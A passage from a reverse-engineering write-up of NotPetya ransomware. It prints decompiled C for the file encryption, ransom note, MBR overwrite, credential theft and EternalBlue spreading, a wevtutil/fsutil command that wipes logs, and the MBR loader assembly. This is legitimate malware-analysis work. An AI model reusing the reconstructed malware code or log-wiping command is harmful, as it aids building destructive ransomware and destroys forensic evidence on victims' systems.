        success = CryptExportKey(lpRansomBuff + 0x14,lpRansomBuff + 0xc,SIMPLEBLOB,0,lpBlobData,&lpBlobLen);
        ptrEncryptedBlob = ret;
        if(success != 0){
            lpEncryptedBlobLen = 0;

            success = CryptBinaryToStringW(lpBlobData,lpBlobLen,CRYPT_STRING_BASE64,NULL,&lpEncryptedBlobLen);

            // Allocate, encode the blob in base64
            if((success && (lpEncryptedBlob = LocalAlloc(GPTR,lpEncryptedBlobLen * 2), lpEncryptedBlob != NULL)) && (success = CryptBinaryToStringW(lpBlobData,lpBlobLen,CRYPT_STRING_BASE64,lpEncryptedBlob,&lpEncryptedBlobLen), ptrEncryptedBlob = lpEncryptedBlob,success == 0)){
                LocalFree(lpEncryptedBlob);
                ptrEncryptedBlob = ret;
            }
        }

        ret = ptrEncryptedBlob;
        LocalFree(lpBlobData);
    }

    return ret;
}
```

##### Back to FUN_10001d32
Looking back to `FUN_10001d32` we see that the `lpPersonalInstallationKey` is the result of the `ptrKeyBlob`. We can directly rename the `exportKeyBlob` function to `generatePersonalInstallationKey`. Now we can clearly see what this function is doing. It's generating a personal installation by using the RSA key in blob form used to encrypt the files.

Anyways, there is the decompiled and cleaned up function:

```c
void generateRansomNote(LPVOID ransomBuffer){
    BOOL success;
    LPWSTR ptrFullPath, lpPersonalInstallationKey;
    uint lpUptime;

    HANDLE hFile;
    WCHAR lpFullPath[780];
    DWORD bytesWritten;
    
    success = getHandleToPubKeyBlob(ransomBuffer);
    if(success && (lpPersonalInstallationKey = generatePersonalInstallationKey(), lpPersonalInstallationKey != NULL)){

        // Drop the README.TXT file
        ptrFullPath = PathCombineW(lpFullPath,(LPCWSTR)ransomBuffer,L"README.TXT");
        if(ptrFullPath != NULL){
            // Sleep
            lpUptime = calculateMalwareUptime();
            if(lpUptime != 0) Sleep((lpUptime - 1) * 60000);
            
            hFile = CreateFileW(lpFullPath,GENERIC_WRITE,0,(LPSECURITY_ATTRIBUTES)0x0,CREATE_ALWAYS,0,(HANDLE)0x0);
            if(hFile != NULL){
                bytesWritten = 0;

                // Write Bitcoin address
                WriteFile(hFile,L"Ooops, your important files are encrypted.\r\n\r\nIf you see this text, then you r files are no longer accessible, because\r\nthey have been encrypted. Perhaps you  are busy looking for a way to recover\r\nyour files, but don\'t waste your time. Nobody can recover your files without\r\nour decryption service.\r\n\r\nWe guarant ee that you can recover all your files safely and easily.\r\nAll you need to do is  submit the payment and purchase the decryption key.\r\n\r\nPlease follow the inst ructions:\r\n\r\n1.\tSend $300 worth of Bitcoin to following address:\r\n\r\n",0x432,&bytesWritten,NULL);

                WriteFile(hFile,L"1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX\r\n\r\n",0x4c,&bytesWritten,NULL);

                // Write mail address
                WriteFile(hFile,L"2.\tSend your Bitcoin wallet ID and personal installation key to e-mail ",0x8e,&bytesWritten,NULL);
                WriteFile(hFile,L"wowsmith123456@posteo.net.\r\n",0x38,&bytesWritten,NULL);


                WriteFile(hFile,L"\tYour personal installation key:\r\n\r\n",0x48,&bytesWritten,NULL);

                /* Omitting again stupid length calculation */

                // Write installation key
                WriteFile(hFile,lpPersonalInstallationKey,((sizeof(lpPersonalInstallationKey) + 1) >> 1) * 2,&bytesWritten,NULL);
                CloseHandle(hFile);
            }
        }

        // I can't find any reference to this buffer, the closest is the key one
        LocalFree(ransomBuffer + 0x18);
    }

    return;
}
```

This is what the README.TXT file looks like when it's generated:
![README note](https://gitlab.naitshiro.it/chry/reverse-engineering/-/raw/main/NotPetya/Images/READMEransom.png)

##### Back to lpStartAddress_10001e51
Now we finally know what the thread routine `lpStartAddress_10001e51` does. It the main ransomware routine, which encrypts the files and drops the ransom note. Note that the context acquired features the RSA_AES. Anyways, look at the decompiled function:

```c
int doRansom(LPVOID *ransomBuffer){
    DWORD lastError;
    BOOL success;
    wchar_t *szProvider;
    
    // Acquire a handle to the crypto provider
    success = CryptAcquireContextW(ransomBuffer + 2,NULL,L"Microsoft Enhanced RSA and AES Cryptographic Provider",RSA_AES,CRYPT_VERIFYCONTEXT);
    if(!success){
        lastError = GetLastError();
        if(lastError == NTE_KEYSET_NOT_DEF){
            lastError = CRYPT_VERIFYCONTEXT;
            szProvider = NULL;
        }

        else {
            if(lastError != NTE_BAD_KEYSET) goto quit;

            lastError = 8;
            szProvider = L"Microsoft Enhanced RSA and AES Cryptographic Provider";
        }

        success = CryptAcquireContextW(ransomBuffer + 2,NULL,szProvider,RSA_AES,lastError);
        if(success == 0) goto quit;
    }

    // Acquire the crypto key
    success = acquireCryptoKey();

    if(success){
        // Pretty self explanatory functions
        loopThroughFilesAndEncrypt(ransomBuffer,15,ransomBuffer);
        generateRansomNote(ransomBuffer);
        CryptDestroyKey(ransomBuffer[5]);
    }

    CryptReleaseContext(ransomBuffer[2],0);

quit:
    LocalFree(ransomBuffer);
    return 0;
}
```

##### Back to FUN_10001eef
Now we also know that this functions does nothing more that launch a thread for each drive to encrypt all the files inside. The cleaned up function looks like the following:

```c
void loopThroughDrivesAndDoRansom(){
    DWORD dwDriveBitmask;
    UINT uDriveType;
    LPVOID *lpRansomBuffer, lpDriveRoot;

    int i = 31;
    
    dwDriveBitmask = GetLogicalDrives();

    do {
        if((dwDriveBitmask & 1 << (i & 0x1f)) != 0){
            // Couldn't simplify more that that, it pretty much increases the letter
            lpDriveRoot = L"A:\\";
            *lpDriveRoot = ('A' + 1);

            uDriveType = GetDriveTypeW(&lpDriveRoot);
            if(uDriveType == DRIVE_FIXED){
                lpRansomBuffer = LocalAlloc(GPTR,32);

                if(lpRansomBuffer != NULL){

                    // Save all the things inside the lpRansomBuffer
                    lpRansomBuffer[4] = L"MIIBCgKCAQEAxP/VqKc0yLe9JhVqFMQGwUITO6WpXWnKSNQAYT0O65Cr8PjIQInTeHkXEjfO2n2JmURWV/uHB0ZrlQ/wcYJBwLhQ9EqJ3iDqmN19Oo7NtyEUmbYmopcq+YLIBZzQ2ZTK0A2DtX4GRKxEEFLCy7vP12EYOPXknVy/+mf0JFWixz29QiTf5oLu15wVLONCuEibGaNNpgq+CXsPwfITDbDDmdrRIiUEUw6o3pt5pNOskfOJbMan2TZu6zfhzuts7KafP5UA8/0Hmf5K3/F9Mf9SE68EZjK+cIiFlKeWndP0XfRCYXI9AJYCeaOu7CXF6U0AVNnNjvLeOn42LHFUK4o6JwIDAQAB";
                    lpRansomBuffer[7] = NULL;
                    lpRansomBuffer[1] = lpDriveRoot;

                    // Launch the thread
                    CreateThread(NULL,0,doRansom,lpRansomBuffer,0,NULL);
                }
            }
        }

        i--;
    } while(i > -1);

    return;
}
```

#### spreadAgainMalwareAndCheckIfPerfcFileExists
##### FUN_10007d6f
And now, for the last custom function called by `Ordinal_1`, we have `FUN_10007d6f`. This function gets called if we have `Windows 2000` all the way to `Windows Vista` versions, and if `SeDebugPrivilege` was acquired. Let's check it out.

It's a rather small function, which calls other reverse engineered function like `spreadMalwareOnNet`, which is responsible to execute the EternalBlue exploit, and `getDllPathWithoutExtension`, which is self explanatory. This function returns 1 however if the exploit saw successfull, and the `perfc` file exists on the `C:\Windows` directory.

Now you know the deal, is the cleaned up function:

```c
int spreadAgainMalwareAndCheckIfPerfcFileExists(short *lpSomeBuff){
    int success, ret = 0;
    BOOL exists;
    WCHAR lpDllPathNoExt[780];
    
    if((globalMalwareBuffer != 0) && (globalFileSize != 0)){
        success = spreadMalwareOnNet(L"127.0.0.1",lpSomeBuff,strlen(lpSomeBuff) + 1 >> 1);

        if(success){
            Sleep(3000);

            success = getDllPathWithoutExtension(lpDllPathNoExt);
            if(success){
                exists = PathFileExistsW(lpDllPathNoExt);
                if(exists) ret = 1;
            }
        }
    }

    return ret;
}
```

##### Clear event logger and shutdown system
We're now at the end of our `perfc.dat` file. All it does now, is simply clearing out the event logger, and then trying to make the PC restart.
And for the final time on `perfc.dat`, here is the cleaned up code:

```c
void Ordinal_1(uint uInt,HANDLE hHandle1,LPCWSTR lpCmdLine,HANDLE hHandle2){
    uint impersonated;
    HANDLE hThread;
    int perfcExists;
    HMODULE hNtdll;
    FARPROC lpNtRaiseHardError;
    BOOL success;
    HANDLE *ptr64handlesBuff;
    SIZE_T dwBytes;
    int *lpMem;
    WCHAR lpStr [8192];
    WCHAR lpEventClearCommand [1023];
    undefined2 local_21e;
    HANDLE lp64handlesBuff [64];
    _OSVERSIONINFOW osVerNumber;
    int *singleHandle;
    DWORD dwFlags;
    
    singleHandle = 0x10007df8;

    // Acquire the privileges, check for antiviruses, and load the malware into memory
    setPrivilegesCheckAVAndLoadIntoMemory();

    // Relaunch the malware form memory
    if(hHandle2 != NULL) launchMalwareFromMemory(uInt,hHandle1,lpCmdLine);

    // Initialize the winsock
    WSAStartup(0x202,0x1001f768);
    globalLpCriticalSection1 = acquireCriticalSection(0x24,0x10006eda,NULL,0xffff);
    globalLpCriticalSection2 = acquireCriticalSection(8,0x10006c74,freeMoreHeap,0xff);

    globalLpNullCriticalSection = NULL;

    InitializeCriticalSection(&globalLpCriticalSection);
    parseCmdLineToDelayExecution(lpCmdLine);
    
    // Check if the SeDebugPrivilege is acquired, then quit if the perfc file is on the windows dir, or inject the MBR payload. Wipe 10 sectors is Kaspersky is found running on the system
    if((globalPrivilegesMask & 2) != 0){
        stopPetyaIfAlreadyInfected();
        overwriteMBRorWipeDisk();
    }

    scheduleShutdown();
    
    // Enumerate Net devices
    CreateThread(NULL,0,enumerateNetDevices,NULL,0,NULL);
    
    // If the SeShutdownPrivilege and SeDebugPrivilege are acquired
    if(((globalPrivilegesMask & 2) != 0) && ((globalAVFlags & 1) != 0)){
        dropResourceAndPipeIntoIt();
    }

    lockSemaphore();

    // This bit check doesn't correspond to any AV detection
    if((globalAVFlags & 2) != 0){
        // Filter out SeShutdownPrivilege, then drop resource 3
        loadAndDropResource3(globalPrivilegesMask & 6);
    }
    
    // If the process has the SeTcbPrivilege privilege, pretty much all it does is execute the malware on other systems in the network
    if((globalPrivilegesMask & 4) != 0){

        // Impersonate all other processes, and steal their tokens
        globalLpNullCriticalSection = acquireCriticalSection(4,0x10007ca5,NULL,0xff);
        impersonated = impersonateAllProcesses(lp64handlesBuff);
        if(impersonated != 0){
            ptr64handlesBuff = lp64handlesBuff;
            uInt = impersonated;
            do {
                singleHandle = (int *)*ptr64handlesBuff;
                lpCmdLine = NULL;
                hHandle1 = NULL;
                
                // Steal credentials, and execute malware on other net systems using wmic or psexec
                lpCmdLine = CreateThread(NULL,0,stealCredentialsAndExecuteMalwareOnOtherSystems,NULL,4,NULL);
                if(lpCmdLine == NULL) hHandle1 = 0x57;
                else {
                    // Set the thread token (acquire the stealed privileges)
                    success = SetThreadToken(&lpCmdLine,singleHandle);
                    if(success == 0) hHandle1 = GetLastError();
                    else {
                        dwFlags = ResumeThread(lpCmdLine);
                        if(dwFlags != -1) goto subAuthThings;
                    }

                    CloseHandle(lpCmdLine);
                }

subAuthThings:
                SetLastError(hHandle1);
                hHandle1 = *ptr64handlesBuff;
                lpCmdLine = NULL;

                // The purpose of this thread is unclear, it does somethings with the subauthority, maybe to steal more credentials?
                hHandle2 = CreateThread(NULL,0,doSmtWithSidSubAuthority,&lpCmdLine,4,NULL);
                if(hHandle2 != NULL){

                    // Use the stolen token to probably acquire some more privileges
                    success = SetThreadToken(&hHandle2,hHandle1);
                    if(success != 0){
                        dwFlags = ResumeThread(hHandle2);
                        if(dwFlags == -1) GetLastError();
                        else WaitForSingleObject(hHandle2,INFINITE);
                    }

                    CloseHandle(hHandle2);
                }

                if(lpCmdLine != NULL) delayExecutionWithRecursion(globalLpNullCriticalSection,ptr64handlesBuff,0);

                ptr64handlesBuff++;
                uInt--;
            } while(uInt != 0);
        }
    }
    
    // Steal the credentials and run the malware on the other hosts using wmic or psexec
    lockSemaphore();
    CreateThread(NULL,0,stealCredentialsAndRunMalwareOnRemoteHostsAllPossibleWays,NULL,0,NULL);

    // Clear all the NotPetya's parameters
    hHandle2 = uInt = lpCmdLine = hHandle1 = NULL;
    
    // Generate some values from the malware uptime
    calculateSmtUptimeMask(&hHandle2,&uInt,&lpCmdLine,&hHandle1);

    // Allocate some memory (probably to perform EternalBlue exploit)
    singleHandle = HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,4);

    if(singleHandle != NULL){
        *singleHandle = lpCmdLine * 60000;
        
        // Perform the EternalBlue exploit
        hThread = CreateThread(NULL,0,performEternalBlueAndWait,singleHandle,0,NULL);

        // If the thread couldn't create, free the heap
        if(hThread == NULL) HeapFree(GetProcessHeap(),0,singleHandle);
    }
    
    Sleep(hHandle2 * 60000);
    
    // No AV flags correspond to the 4th bit, anyways, the malware here does its ransom things looping through all the drives
    if((globalAVFlags & 16) != 0) loopThroughDrivesAndDoRansom();
    
    Sleep(hHandle1 * 60000);

    // If SeDebugPrivilege was acquired
    if((globalPrivilegesMask & 2) == 0){
        // Prepare windows struct, and get the version
        memset(&osVerNumber,0,0x114);
        osVerNumber.dwOSVersionInfoSize = 0x114;
        success = GetVersionExW(&osVerNumber);

        // If we're runnning a version ranging from Windows 2000 to Windows Vista
        if(success && (((osVerNumber.dwMajorVersion == 5 && ((osVerNumber.dwMinorVersion == 1 || (osVerNumber.dwMinorVersion == 2)))) || ((osVerNumber.dwMajorVersion == 6 && ((osVerNumber.dwMinorVersion == 0 || (osVerNumber.dwMinorVersion == 1)))))))){
            // Prepare to run the EternalBlue exploit
            prepareSmtString(lpStr);
            perfcExists = spreadAgainMalwareAndCheckIfPerfcFileExists(lpStr);

            // If the perfc file exists on the disk, quit
            if(!perfcExists) goto quit;
        }
    }

    Sleep(uInt * 60000);

    // Clear event logger
    wsprintfW(lpEventClearCommand,L"wevtutil cl Setup & wevtutil cl System & wevtutil cl Security & wevtutil cl Application & fsutil usn deletejournal /D %c:",lpFullDllPath);
    
    // Execute the command
    executeCmdCommand(3);
    if((globalPrivilegesMask & 1) != 0){

        // Try to raise a hard error to make windows crash
        hNtdll = GetModuleHandleA("ntdll.dll");
        if((hNtdll != NULL) && (lpNtRaiseHardError = GetProcAddress(hNtdll,"NtRaiseHardError"), lpNtRaiseHardError != NULL)) (*lpNtRaiseHardError)(0xc0000350,0,0,0,OptionOkNoWait,&lpCmdLine);

        // If it fails, initiate system shutdown
        success = InitiateSystemShutdownExW(NULL,NULL,0,TRUE,TRUE,SHTDN_REASON_FLAG_PLANNED);

        if(!success){
            // If it fails again, forcefully reboot windows
            ExitWindowsEx((EWX_REBOOT | EWX_FORCE),SHTDN_REASON_MINOR_OTHER);
        }
    }

quit:
    ExitProcess(0);
}
```

And there you have it, this is all `perfc.dat` does!

### res1.exe
We now should also check what this resource does. But before dropping it into ghidra, we should first check the file hash online: it's not uncommon for malwares to use legittimate tools and exploiting them for their advantages.

Let's quickly calculate the SHA256 of both the x64 and x32 resources, and do a quick web search:

```
chry@DESKTOP-LTE52TI:~/Documents/reverse-engineering/NotPetya/Sample/Dropped/perfc.dat.extracted$ sha256sum res1.exe res2.exe 
02ef73bd2458627ed7b397ec26ee2de2e92c71a0e7588f78734761d8edbdcd9f  res1.exe
eae9771e2eeb7ea3c6059485da39e77b8c0c369232f01334954fbac1c186c998  res2.exe
```

Almost with no efforts, VirusTotal shows up and tells us that it a Windows Credential Stealer. After dropping both files into ghidra we can tell they are exactly the same, as we expected. I'll analyze the x86 version one, mainly because ooanalyzer works on x86. x64 is experimental, so it could work, but I prefer to be safe.

#### acquirePipeHandle
##### FUN_004020b7
This is the main function, which immediately checks for arguments, and if at lest one is supplied (and we know exactly what argument it is), it passes it into `FUN_00401fec`.

##### FUN_00401fec
We already know what the function parameter is, so we'll just rename it `pipeName`.

The function Initializes the security descriptor, then it creates a file with the pipe name, using both read and write permissions, if the file was successfully created, it returns the file handle, else it waits for the pipe to be created, and this repeats over and over.

The clened up function looks like this:

```c
HANDLE acquirePipeHandle(LPCWSTR pipeName){
    int j, i = 3, lastError;
    HANDLE hFile, hKernel32;
    FARPROC lpGetLastError;

    BOOL gotten;
    DWORD dwFlags;
    SIZE_T dwBytes;

    SECURITY_ATTRIBUTES lpSecurityAttributes;
    
    lpSecurityAttributes.lpSecurityDescriptor = NULL;
    lpSecurityAttributes.nLength = 0xc;
    lpSecurityAttributes.bInheritHandle = 0;
    
    lpSecurityAttributes.lpSecurityDescriptor = HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,0x14);

    // Initialize security descriptor
    if((lpSecurityAttributes.lpSecurityDescriptor != NULL) && (gotten = InitializeSecurityDescriptor(lpSecurityAttributes.lpSecurityDescriptor,1), gotten != 0)){
        j = SetSecurityDescriptorDacl(lpSecurityAttributes.lpSecurityDescriptor,1,NULL,0);
        do {
            while(true){
                if(j == 0) return NULL;
                
                i--;

                // Get a handle to the pipe file
                hFile = CreateFileW(pipeName,(GENERIC_WRITE | GENERIC_READ),0,&lpSecurityAttributes,OPEN_EXISTING,0,NULL);

                if(hFile != NULL) return hFile;
                
                hKernel32 = GetModuleHandleW(L"kernel32");
                lpGetLastError = GetProcAddress(hKernel32,"GetLastError");

                lastError = (*lpGetLastError)();

                j = i;

                if(lastError == 0xe7) break;

                Sleep(3000);
            }

            gotten = WaitNamedPipeW(pipeName,3000);
        } while(gotten != 0);
    }

    return NULL;
}
```

#### logicGoingOnAndProcessManipulationThings
Looking inside the `logicGoingOnAndProcessManipulationThings` function is a big mess, mainly because some parameters are hard to understand (ex. on the `OpenProcess` function the application name is is not as easy to see as you may think). However, firing the program with `x64dbg` reveals that the call to `OpenProcess` is done on the `lsass.exe` process, which is responsible for keeping the credentials of the system.

It also seems to read memory from `lsasrv.dll`, which surprise surprise, is also related to system credential things. It's safe to assume that this file steals credentials from `lsass.exe` and `lsasrv.dll`.

### PayloadMBR.bin
***Note: All the assembly code of the MBR payload will be extracted from cutter, and adjusted accordingly to what I'll see on Bochs...***

***Note: In this section you'll find pure assembly code. If you don't have a general understanding of assembly, or simply don't know the basics, I highly recommend to learn at least them, to enjoy the read and understand the code, as I won't explain every single assembly line. Assembly here is necessary...***

*Note: during this reverse engineering journey I decided to use the Bochs emulator. Feel free to switch gears and opt for an alternative emulator, the choice is yours. I just use this because it's free, and really easy to use, yet it doesn't lack some important features, such as memory dump or stack view...*

#### Configuration
*Note: before starting to reverse engineer the MBR payload, we need to setup some tools in order to do that... I'll be using the [Bochs emulator](https://bochs.sourceforge.io/), which is a fantastic x86 emulator and debugger. For the emulator configuration, I kindly invite you to check out [this](https://gitlab.naitshiro.it/chry/reverse-engineering/blob/master/BOCHS.md) markdown...*

I've put some files inside the `Sample/Dropped/MBR` folder, which include `BIOS-bochs-latest`, `VGABIOS-lgpl-latest`, the disk image, the payload dump (trust me, you'll need this lot of times), and the `bochsrc.bxrc` file.

There are also other files, being `PayloadMBR_cutter.bin`, `FirstStage.rzdb` and `SecondStage.rzdb`. Those ones are only used by me on cutter just to give you have a better disassembly view. However, due to the fact that some code is dynamic, I'll always refer to the Bochs disassembly. So don't take the cutter disassembly seriously without checking Bochs.

*Note: you'll need to edit some file lines in order to run the emulation. Open it, and edit it accordingly...*

Now that we're set up to run the payload, we can run bochs, and break to the address `0x7c00`.

#### Load payload into memory
##### Main MBR code
This part of the code is nothing special, as it simply setting up the stack, putting `0x20` in `EAX` and calling a function. Then, when `EAX` becomes 0, it jumps to the address `0x8000`. Another interesting detail is that the disk identifier is saved in `0x7c93`. Let's investigate what `fcn.00007c38` does.

##### fcn.00007c38
Inside this small snippet we can see that the interrupt number 0x13 is invoked, performing a read operation on the disk. Looking up at the interrupt details in a table kindly provided by [wikipedia](https://en.wikipedia.org/wiki/INT_13H), reveals some more details:

**INT 13h AH = 42h: Extended Read Sectors From Drive**

| Registers 	| Description                                   |
|---------------|-----------------------------------------------|
| AH 	        | 42h = function number for extended read       |
| DL 	        | drive index (e.g. 1st HDD = 80h)              |
| DS:SI         | segment:offset pointer to the DAP, see below  |

**DAP: Disk Address Packet**

| offset range 	| size 	    | description                                                                               |
|---------------|-----------|-------------------------------------------------------------------------------------------|
| 00h 	        | 1 byte 	| size of DAP (set this to 10h)                                                             |
| 01h 	        | 1 byte 	| unused, should be zero                                                                    |
| 02h .. 03h 	| 2 bytes 	| number of sectors to be read                                                              |
| 04h .. 07h 	| 4 bytes 	| segment:offset pointer to the memory buffer to which sectors will be transferred          |
| 08h .. 0Fh 	| 8 bytes 	| absolute number of the start of the sectors to be read using logical block addressing     |

**Results**

| Registers 	| Description                       |
|---------------|-----------------------------------|
| CF 	        | Set On Error, Clear If No Error   |
| AH 	        | Return Code                       |

We can see from the debugger where the DAP is located: `DS = 0x0000` and `SI = 0x7bdc`, so `DS:SI = 0x00007bdc`. We see that the DAP structure is large 16 bytes, so we can dump 16 bytes from `0x00007bdc` to retrieve the DAP: `10 00 01 00 00 80 00 00 01 00 00 00 00 00 00 00`. Indeed, we see that the first byte is `0x10` and the second is `0x00`, so we can confirm that the structure is valid.

Also, remeber that in multi-byte cases, the bytes are interpreted in little endian, meaning that the least significant bytes are the first (effectively reversing the byte order).

Anyways, reading the DAP structure, we can see that `00 01` sectors are being read from the disk, and written to address `00 00 80 00`, reading sector number `00 00 00 00 00 00 00 01` (the second one). We can see that after the interrupt is called, no errors occoured (`AH` is 0, and `CF` is not set), and at address `0x8000` the second sector of the drive is saved.

If the read fails, the malware reset the drive untill the sector is successfully read. The value of the carry flag is added to `EAX`, `1` is added to `EBX` and `0x200` is added to `CX`, then if `CF` is not set the function exits, if it's set, `0x10` is added to `ES`, maybe to change the segment to where gather some data.

This function in general reads the second sector of the drive, and loads it into `0x8000`.
But that's not all. Actually, this function gets executed 32 times, because untill `EAX` becomes 0, the function changes the DAP structure to increase the memory offset where the read sectors are stored, and the sector number. For example, when we execute the function the last time, this is what the DAP structure looks like: `10 00 01 00 00 BE 00 00 20 00 00 00 00 00 00 00`

What this function does, is actually reading and saving into memory starting at address `0x8000` the first 32 sectors of the disk after the MBR (note that the DAP structure changes before each function call). We'll rename this function `store32SectorsAfterMBRInMemory`.

Here is what the disassembly looks like:

```s
0000:7c38      push    eax                  ; Save the sectors counter
0000:7c3a      xor     eax, eax
0000:7c3d      push    dx

0000:7c3e      push    si
0000:7c3f      push    di
0000:7c40      push    eax

0000:7c42      push    ebx
0000:7c44      mov     di, sp
0000:7c46      push    eax

0000:7c48      push    ebx
0000:7c4a      push    es
0000:7c4b      push    cx

0000:7c4c      push    1
0000:7c4e      push    0x10
0000:7c50      mov     si, sp               ; This will be the offset in which the DAP structure will be found (DS is 0)

0000:7c52      mov     dl, byte [0x7c93]    ; This contains the drive number, in this case 0x80
0000:7c56      mov     ah, 0x42             ; This is the code for the "Read Sectors From Drive"
0000:7c58      int     0x13                 ; Interrupt related to drives I/O

0000:7c5a      mov     sp, di
0000:7c5c      pop     ebx
0000:7c5e      pop     eax

0000:7c60      jae     0x7c6a               ; Jump if CF = 0
0000:7c62      push    ax
0000:7c63      xor     ah, ah               ; The code for "Reset Disk System"

0000:7c65      int     0x13                 ; The drive I/O interrupt
0000:7c67      pop     ax
0000:7c68      jmp     0x7c40               ; Go back to the read (effectively creating a loop)

0000:7c6a      add     ebx, 1
0000:7c6e      adc     eax, 0               ; This simply adds 1 to eax if CF is set
0000:7c72      add     cx, 0x200

0000:7c76      jae     0x7c7f               ; Jump if CF = 0
0000:7c78      mov     dx, es               ; Those three instructions add 0x10 to es (they change the segment)
0000:7c7a      add     dh, 0x10             ; 

0000:7c7d      mov     es, dx               ; 
0000:7c7f      pop     di
0000:7c80      pop     si

0000:7c81      pop     dx
0000:7c82      pop     eax                  ; Pop out the sectors counter
0000:7c84      ret
```

##### Back to the main MBR code
We now know that the strange loop we saw earlier is nothing more that the sectors counter used to store 32 sectors into memory after the MBR. When all the sectors have been successfully copied a long jump is made into address `0x0000:0x8000`. This is what the disassembly looks like so far:

```s
0000:7c00      cli                                          ; Clear Interrupt Flag
0000:7c01      xor     ax, ax
0000:7c03      mov     ds, ax

0000:7c05      mov     ss, ax
0000:7c07      mov     es, ax
0000:7c09      lea     sp, [0x7c00]                         ; Setup the stack

0000:7c0d      sti                                          ; Set Interrupt Flag
0000:7c0e      mov     eax, 0x20
0000:7c14      mov     byte [0x7c93], dl                    ; Store the disk identifier in 0x7c93

0000:7c18      mov     ebx, 1
0000:7c1e      mov     cx, 0x8000
0000:7c21      call    store32SectorsAfterMBRInMemory       ; Call the function

0000:7c24      dec     eax
0000:7c26      cmp     eax, 0
0000:7c2a      jne     0x7c21                               ; Jump back to the function if ZF = 0

0000:7c2c      mov     eax, dword [0x8000]
0000:7c30      ljmp    0:0x8000                             ; Long jump to address 0x0000:0x8000

0000:7c35      hlt                                          ; Halt the system
0000:7c36      jmp     0x7c35                               ; Jump to halt instruction
```

We know that this is the first stage of the payload, as it simply copies itself into memory from address `0x0000:0x8000` to address `0x0000:0xBFFF`, and then long jumps into that address.

It's time to dive deep into the second stage.

##### Address 0x0000:0x84e8
Upon hitting the long jump, we see that it immediately jumps again to address `0x84e8`. We can see that at this address there is the `ENTER` instruction, which is used to create a stack frame in the stack (simplifying, it's reserving memory on the stack). We can tell by it's parameter that it's creating a stack frame with size `0x0286` bytes, with no alignment.

We can now see that the value of `SI` is pushed in the new stack frame, before calling two other functions, `fcn.00008932` and `fcn.00008948`.

Let's go investigate those functions first.

#### initializeScreen
##### fcn.00008932
This function is rather small. From the disassembly we can see that after saving the address of the base pointer of the stack frame and copying the value of `SP` to `BP`, it invokes the `INT 0x10`, which is the video interrupt. We can see that before the invocation, the content of `AX` is `0x0003`. We can further break down the register into the two 8-bit ones, `AH`, which contains `0x00`, and `AL`, which contains `0x03`.

Looking to the interrupt description on the **Ralf Brown's Interrupt List**, which you can download from [here](https://www.cs.cmu.edu/~ralf/files.html) (you can also search the parameters on wikipedia, but I find this list more complete; the lists can be also found on the root of the repo), we can see that with `AH` being `0x00`, the interrupt changes the video mode. Now we need to check what the parameter in `AL`, we can see that one of the following modes can be applied:

**AL = 00h**
| text / graphical | text resolution | pixel box | pixel resolution | colors | display pages | screen address | system         |
|------------------|-----------------|-----------|------------------|--------|---------------|----------------|----------------|
| T                | 80x25	         | 8x8       | 640x200          | 16     | 4             | B800           | CGA,PCjr,Tandy |
| T                | 80x25	         | 8x14      | 640x350          | 16/64  | 8             | B800           | EGA            |
| T                | 80x25	         | 8x16      | 640x400          | 16     | 8             | B800           | MCGA           |
| T                | 80x25	         | 9x16      | 720x400          | 16     | 8             | B800           | VGA            |
| T                | 80x43	         | 8x8       | 640x350          | 16     | 4             | B800           | EGA,VGA [17]   |
| T                | 80x50	         | 8x8       | 640x400          | 16     | 4             | B800           | VGA [17]       |

Note that those configurations are dependent from system to system, but the idea is that it's preparing to write to the screen. Bosch uses the VGA adapter, so we should expect to see results from the VGA systems.

Anyways, we see that they are all text mode, suggesting that the malware is about to write it's fake chkdsk screen.
The second call puts the value `0x0500` in `AX`. I'm not breaking down as I did before all the single registers values, as you can do the same thing I did, but seaching for `AX = 05h` and `AL = 00h` (in this case the table is the same, but we're now selecting the display pages column).

As I already mentioned, this does nothing more that selecting the display pages. From the VGA adapter list, which are the one that interests Bochs adapter, the pages should be 8 (there are multiple VGA entries).

Next interrupt invocation puts `0x2607` in `CX` and `0x01` in `AH`. This sets the cursor shape to invisible, and select the page number 6, which further confirms that Bochs is using the VGA entry we discussed above.

All and all, this function simply prepares the screen to be written, so we'll just rename the function to `initializeScreen`. This is the disassembly:

```s
0000:8932      push    bp                   ; Those two instructions are the same as the ENTER instruction
0000:8933      mov     bp, sp               ;
0000:8935      mov     ax, 3

0000:8938      int     0x10                 ; Change the video mode to text
0000:893a      mov     ax, 0x500
0000:893d      int     0x10                 ; Change the video page to 6

0000:893f      mov     cx, 0x2607
0000:8942      mov     ah, 1
0000:8944      int     0x10                 ; Change the cursor to invisible

0000:8946      leave
0000:8947      ret
```

##### fcn.000085de
Back to `0x0000:0x8000`, now `fcn.000085de` is called. Inside this function we can see a value being pushed to the stack followed by a call to `fcn.00008950` and a value retrived from the stack put in `EBX`.

We have no better choise but to investigate what `fcn.000085de` does.

##### fcn.00008950
Inside `fcn.00008950` we see again `INT 0x10` being invoked. Again, I won't go into details to every value the registers have, but the general idea is that those interrupt simply clears the screen and sets the cursor position to the top left of the screen in the page 0. We can rename this function `clearScreen`.

Here is the disassembly code:

```s
0000:8950      push    bp                   ; Those two instructions are the same as the ENTER instruction
0000:8951      mov     bp, sp               ;
0000:8953      mov     bh, byte [bp + 4]    ; Get back from the stack 0xf

0000:8956      xor     cx, cx
0000:8958      mov     dx, 0x184f
0000:895b      mov     ax, 0x600            ; AH = 06h with AL = 00h clears the screen

0000:895e      int     0x10                 ; Clear the screen
0000:8960      xor     bh, bh               ; Page number 0
0000:8962      xor     dx, dx               ; Row and column 0 (top left)

0000:8964      mov     ah, 2                ; Code to set the cursor position
0000:8966      int     0x10                 ; Set the cursor position
0000:8968      leave

0000:8969      ret
```

##### Back to fcn.00008948
Now we can see what `fcn.00008948` does:

```s
0000:8948      push    0xf                  ; Save 0xf
0000:894a      call    clearScreen
0000:894d      pop     bx                   ; Retrieve 0xf

0000:894e      ret
```

However this doesn't quite fully explain the purpose of the `PUSH 0xf` and `POP BX` instructions. We are not going into details, but I think this function is a bit more generic that a seemingly random `PUSH` instruction.

I'm just going to rename this function `clsAndPutWordInBX`.

#### storeSectorInMemoryAndDoLogic
##### fcn.00008a64
After the execution of `clsAndPutWordInBX`, we see that an effective address is saved on the `AX` register using the `LEA` instruction, then pushed into the stack, and `fcn.00008a64` is called. This address turned out to be `0x7b78`. I don't see some familiar things, but I think we might see then in `fcn.00008a64`.

